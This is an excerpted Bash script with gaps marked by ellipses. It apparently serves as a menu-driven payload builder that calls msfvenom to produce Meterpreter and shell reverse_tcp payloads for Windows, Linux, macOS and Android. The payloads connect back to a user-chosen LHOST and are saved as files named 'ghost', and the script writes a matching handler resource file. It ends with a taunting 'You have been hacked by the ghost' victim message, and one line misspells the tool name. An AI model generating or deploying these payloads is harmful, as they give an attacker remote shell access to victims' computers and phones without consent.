...
tput sgr0
echo -e "\E[1;33m:::\e[97m[X] \e[32mHack The WORLD    \e[97m [Hac/< The P1aneT]   \E[1;33m"
...
# Note variable is quoted.
  ...
  echo -e "\E[1;33m::::: \e[97mLets Make Our Payloads\E[1;33m:::::"
...
do
    case $opt in
        "Windows")
            ...
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/ghost.exe
            echo -e "\E[1;33m::::: \e[97mghost.exe saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/ghost.elf
            echo -e "\E[1;33m::::: \e[97mghost.elf saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/ghost.macho
            echo -e "\E[1;33m::::: \e[97mghost.macho saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/ghost.apk
            echo -e "\E[1;33m::::: \e[97mghost.apk saved to ~/Desktop/temp\E[1;33m:::::"
            ;;  
        "List_All")
            xterm -e msvenom -l &
            ;;   
...
do
    case $opt in
        ...
        "Android")
            ...
            echo set PAYLOAD android/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
...
echo
echo        You have been hacked by the ghost..........
echo         
echo
echo                                COMMAND
echo        Access granted!
echo
echo                                RUN
echo        The VIRUS is in the administration system.
echo
echo        YOU FEEL NOTHING CAUSE YOU VE BEEN HACKED BY GHOST.
echo
echo                                UNISTALL
echo        REMOVE PAYLOAD
echo
